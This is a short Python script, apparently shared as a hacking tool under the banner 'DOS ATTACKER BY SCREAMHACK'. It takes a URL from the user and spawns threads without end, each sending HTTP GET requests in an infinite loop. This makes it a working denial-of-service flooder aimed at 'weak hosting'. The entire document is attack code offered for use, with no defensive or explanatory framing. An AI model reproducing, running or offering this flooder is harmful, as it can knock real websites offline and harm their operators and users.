import threading
import requests

print("YOU LAUNCH DOS ATTACKER BY SCREAMHACK\nquit - exit of the app\n[!] WARNING: This loads the system very much.\nIt works on weak hosting\n")
url = input("enter URL: ")

if url == "quit":
  exit()

def dos():
 while True:
  requests.get(url)
  
while True:
 threading.Thread(target=dos).start()